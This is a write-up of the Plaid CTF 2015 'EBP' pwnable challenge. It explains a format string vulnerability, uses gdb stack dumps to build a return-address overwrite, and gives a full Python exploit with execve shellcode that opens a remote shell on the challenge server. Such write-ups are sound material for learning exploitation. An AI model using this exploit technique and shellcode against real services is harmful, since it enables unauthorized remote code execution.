# EBP Pwnable (160 pts) - Plaid CTF 2015 writeup#
```sh
nc 52.6.64.173 4545
Download: %p%o%o%p.
```
***flag: flag{who_needs_stack_control_anyway?}*** 

## Analysis ##
```sh
gdb-peda$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf  
Reading symbols from ebp_a96f7231ab81e1b0d7fe24d660def25a.elf...(no debugging symbols found)...done.  
gdb-peda$ checksec  
CANARY    : disabled  
FORTIFY   : disabled  
NX        : disabled  data areas of memory as executable.  
PIE       : disabled  
RELRO     : Partial  
```

This program retrieves data from user and sends back to user. It's very simple.

The pseudocode:
```c
int make_response()
{
  return snprintf(response, 1024u, buf);
}

int echo()
{
  make_response();
  puts(response);
  return fflush(stdout);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@3

  while ( 1 )
  {
    result = (int)fgets(buf, 1024, stdin);
    if ( !result )
      break;
    echo();
  }
  return result;
}
```

We can see there is a format string vulnerability caused by the **snprintf** function call which doesn’t specify a format. User can read or write anywhere. 
The binary uses 0x2 static arrays to store user data and respond. We can't use user-supplied data to control which addresses to be written. What should we do?

Let's debug more deeply.

Lauch program and set breakpoint at *0x804851a*.

The stack is:
```sh
00:0000| esp 0xffa4a630 --> 0x804a480 --> 0x0
01:0004|     0xffa4a634 --> 0x400
02:0008|     0xffa4a638 --> 0x804a080 ("%4$08x\n")
03:0012|     0xffa4a63c --> 0xa (b'\n')
04:0016|     0xffa4a640 --> 0x1
05:0020|     0xffa4a644 --> 0xf7701000 --> 0x1a5da8
06:0024| ebp 0xffa4a648 --> 0xffa4a668 --> 0xffa4a688 --> 0x0
07:0028|     0xffa4a64c --> 0x804852c (<echo+11>:       mov    DWORD PTR [esp],0x804a480)
08:0032|     0xffa4a650 --> 0xffa4a688 --> 0x0
09:0036|     0xffa4a654 --> 0xf7735480 (pop    edx)
10:0040|     0xffa4a658 --> 0xffa4a6b4 --> 0xf7701000 --> 0x1a5da8
11:0044|     0xffa4a65c --> 0xf7701000 --> 0x1a5da8
12:0048|     0xffa4a660 --> 0x0
13:0052|     0xffa4a664 --> 0x0
14:0056|     0xffa4a668 --> 0xffa4a688 --> 0x0
15:0060|     0xffa4a66c --> 0x8048557 (<main+16>:       mov    eax,ds:0x804a040)
16:0064|     0xffa4a670 --> 0x804a080 ("%4$08x\n")
17:0068|     0xffa4a674 --> 0x400
18:0072|     0xffa4a678 --> 0xf7701c20 --> 0xfbad2088
19:0076|     0xffa4a67c --> 0xf7701000 --> 0x1a5da8
20:0080|     0xffa4a680 --> 0x8048580 (<__libc_csu_init>:       push   ebp)
21:0084|     0xffa4a684 --> 0x0
22:0088|     0xffa4a688 --> 0x0
23:0092|     0xffa4a68c --> 0xf7574a63 (<__libc_start_main+243>:        mov    DWORD PTR [esp],eax)
```

I input *"%4$08x\n"* to read the fourth parameter. I use this value to calculate the other values in stack. Notice that, the value of the fourth parameter is a pointer to another variable in stack. If I overwrite one byte at this pointer, I can overwrite anywhere in stack!!.  

I put shellcode at *0x0804A080*. Our purpose is to overwrite the return address of "echo" function (current value is *0x8048557*) with *0x0804A080*.  

The fourth parameter is a pointer to the 12th parameter. I use the fourth parameter to overwrite the 12th parameter. After that, I use the 12th parameter to write data. I prepare 0x4 double-words to overwrite 0x4 bytes of return address of "echo" function.  

For example:  
0xffa4a66c points to return address of "echo" function. We need to write 0x4 bytes: 0x80, 0xA0, 0x04, 0x08 at 0xffa4a66c. I prepare 4 double-words : 0xffa4a66c, 0xffa4a66d, 0xffa4a66e, 0xffa4a66f to write data. 
They are the 20th, 21th, 22th and 23th parameters. I use 0x4 parameters to overwrite return address.  

```sh
00:0000| esp 0xffa4a630 --> 0x804a480 (' ' <repeats 150 times>, "a\n")
01:0004|     0xffa4a634 --> 0x400
02:0008|     0xffa4a638 --> 0x804a080 ("%1$151x%4$hhn\n")
03:0012|     0xffa4a63c --> 0xa (b'\n')
04:0016|     0xffa4a640 --> 0x1
05:0020|     0xffa4a644 --> 0x0
06:0024| ebp 0xffa4a648 --> 0xffa4a668 --> 0xffa4a697 --> 0xa4a72cff
07:0028|     0xffa4a64c --> 0x804852c (<echo+11>:       mov    DWORD PTR [esp],0x804a480)
08:0032|     0xffa4a650 --> 0xf7701ac0 --> 0xfbad2884
09:0036|     0xffa4a654 --> 0xf7735480 (pop    edx)
10:0040|     0xffa4a658 --> 0xffa4a6b4 --> 0xf7701000 --> 0x1a5da8
11:0044|     0xffa4a65c --> 0xf7701000 --> 0x1a5da8
12:0048|     0xffa4a660 --> 0x0
13:0052|     0xffa4a664 --> 0x0
14:0056|     0xffa4a668 --> 0xffa4a697 --> 0xa4a72cff
15:0060|     0xffa4a66c --> 0x8048557 (<main+16>:       mov    eax,ds:0x804a040)
16:0064|     0xffa4a670 --> 0x804a080 ("%1$151x%4$hhn\n")
17:0068|     0xffa4a674 --> 0x400
18:0072|     0xffa4a678 --> 0xf7701c20 --> 0xfbad2088
19:0076|     0xffa4a67c --> 0xf7701000 --> 0x1a5da8
20:0080|     0xffa4a680 --> 0x8048580 (<__libc_csu_init>:       push   ebp)
21:0084|     0xffa4a684 --> 0x0
22:0088|     0xffa4a688 --> 0xffa4a66c --> 0x8048557 (<main+16>:        mov    eax,ds:0x804a040)
23:0092|     0xffa4a68c --> 0xffa4a66d --> 0x80080485
24:0096|     0xffa4a690 --> 0xffa4a66e --> 0xa0800804
25:0100|     0xffa4a694 --> 0xffa4a66f --> 0x4a08008
```

Overwrite return address:
```python
   s = shellcode \
    +'%'+'1$'+str(0x80 -len(shellcode)) +'x%20$hhn' \
    +'%'+'1$'+str(0xa0 -0x80) +'x%21$hhn' \
    +'%'+'1$'+str(0x104 -0xa0) +'x%22$hhn' \
    +'%'+'1$4x%23$hhn' \
    +'\n'

    sock.sendall(s)
```

Stack context:
```sh
[------------------------------------code------------------------------------]
   0x804853d <echo+28>: mov    DWORD PTR [esp],eax
   0x8048540 <echo+31>: call   0x80483a0 <fflush@plt>
   0x8048545 <echo+36>: leave
=> 0x8048546 <echo+37>: ret
   0x8048547 <main>:    push   ebp
   0x8048548 <main+1>:  mov    ebp,esp
   0x804854a <main+3>:  and    esp,0xfffffff0
   0x804854d <main+6>:  sub    esp,0x10
[-----------------------------------stack------------------------------------]
00:0000| esp 0xffa4a66c --> 0x804a080 --> 0xdb31c031  <= we got the shell
01:0004|     0xffa4a670 --> 0x804a080 --> 0xdb31c031
02:0008|     0xffa4a674 --> 0x400
03:0012|     0xffa4a678 --> 0xf7701c20 --> 0xfbad2088
04:0016|     0xffa4a67c --> 0xf7701000 --> 0x1a5da8
05:0020|     0xffa4a680 --> 0x8048580 (<__libc_csu_init>:       push   ebp)
06:0024|     0xffa4a684 --> 0x0
07:0028|     0xffa4a688 --> 0xffa4a66c --> 0x804a080 --> 0xdb31c031
[----------------------------------------------------------------------------]
```

## Exploit code ##
```python
import socket
import sys
import struct
import time
import telnetlib
import string

# 52.6.64.173 4545
HOST = '52.6.64.173'
PORT = 4545

#HOST = '192.168.66.150'
#PORT = 4000

def recv_size(sock, size):
    buf = ""
    while len(buf) < size:
        buf += sock.recv(1)
    return buf

shellcode = ""
# dup2(4)
shellcode += "\x31\xc0\x31\xdb\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xb3\x04\xcd\x80\x75\xf6"
# execve
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

def write_byte(sock, index, value):
    if value > 0:
        s = '%'+'1$'+str(value)+'x%'+str(index)+'$hhn\n'
    else:
        s = '%'+'1$256x%'+str(index)+'$hhn\n'
    sock.sendall(s)
    if value > 0:
        recv_size(sock, value )
    else:
        recv_size(sock, 256 )

def exploit(sock):
    sock.sendall( '%4$08x' + '\n' )# read stack addr
    buf = sock.recv(1024)
    temp = int(buf, 16)
    echo_return_at = temp + 4

    addr = echo_return_at
    r = temp + 0x20 #
    for i in range(4):
        last_byte = r & 0xff
        for c in struct.pack("<I", addr):
            write_byte(sock, 4, last_byte)# overwrite the 12th parameter
            write_byte(sock, 12, ord(c))  # use the 12th parameter to write data
            last_byte += 1
        r += 4
        addr += 1

    # shellcode written at 0x804a080

    s = shellcode \
    +'%'+'1$'+str(0x80 -len(shellcode)) +'x%20$hhn' \
    +'%'+'1$'+str(0xa0 -0x80) +'x%21$hhn' \
    +'%'+'1$'+str(0x104 -0xa0) +'x%22$hhn' \
    +'%'+'1$4x%23$hhn' \
    +'\n'

    sock.sendall(s)
    time.sleep(0.1)
    print " [+] now, your turn!"
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()
    sock.close()

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        print ' [+] Connected to',(HOST, PORT)
        exploit(sock)
        sock.close()
        sys.exit(0)
    except:
        sys.exit(1)

if __name__ == "__main__":
    main()
```
## Capture the flag![Capture the flag](https://github.com/piggybird/ctf/raw/master/PlaidCTF-2015/pwnable/ebp/flag.png)
